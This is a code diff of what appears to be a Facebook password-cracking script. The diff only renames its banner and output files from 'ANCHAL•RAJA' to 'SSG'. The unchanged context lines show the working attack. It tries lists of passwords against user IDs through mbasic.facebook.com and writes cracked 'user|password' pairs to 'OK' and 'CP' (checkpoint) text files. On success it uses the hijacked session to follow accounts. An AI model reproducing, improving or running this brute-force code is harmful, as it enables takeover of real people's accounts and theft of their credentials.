@@ -255,7 +255,7 @@ class __bsn__:
     def __api__(self, user, __chi__):
         global ok,cp,loop        
         for i in list('\|-/'):
-            sys.stdout.write(f'\r \x1b[1;97m[RAJA] /{loop}/ [{len(self.id)}]\x1b[1;97m[OK] [{len(ok)}] [CP] [{len(cp)}] '),
+            sys.stdout.write(f'\r \x1b[1;97m[SSG] /{loop}/ [{len(self.id)}]\x1b[1;97m[OK] [{len(ok)}] [CP] [{len(cp)}] '),
             sys.stdout.flush()
         for pw in __chi__:
             pw = pw.lower()
@@ -263,7 +263,7 @@ class __bsn__:
             except: pass
             w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
             if "access_cookies" in p:
-                print('\r [ANCHAL•RAJA OK| %s | %s ' % (user,pw))
+                print('\r [SSG~ OK| %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
                 open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
@@ -285,7 +285,7 @@ class __bsn__:
                     year  = ''
                 except:
                     pass
-                print('\r%s \033[1;94m[ANCHAL•RAJA |CP| %s | %s ' % (K,user,pw))
+                print('\r%s \033[1;94m[SSG~ |CP| %s | %s ' % (K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
@@ -296,7 +296,7 @@ class __bsn__:
 
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r \x1b[1;97m[RAJA] /{loop}/ [{len(self.id)}]\x1b[1;97m[OK] [{len(ok)}] [CP] [{len(cp)}] '),
+        sys.stdout.write(f'\r \x1b[1;97m[SSG] /{loop}/ [{len(self.id)}]\x1b[1;97m[OK] [{len(ok)}] [CP] [{len(cp)}] '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -349,7 +349,7 @@ class __bsn__:
                     print(f'\r{H} [ANCHAL•RAJA OK|{user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('ANCHAL~RAJA-ok.txt' , 'a').write('%s\n' % wrt)
+                    open('SSG~ok.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -361,17 +361,17 @@ class __bsn__:
                         print('\r%s \033[1;94m[ANCHAL•RAJA CP| %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('ANCHAL~RAJA-cp.txt' , 'a').write('%s\n' % wrt)
+                        open('SSG~cp.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;94m[ANCHAL•RAJA CP| %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;94m[SSG~ CP| %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('ANCHAL~RAJA-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('SSG~cp.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
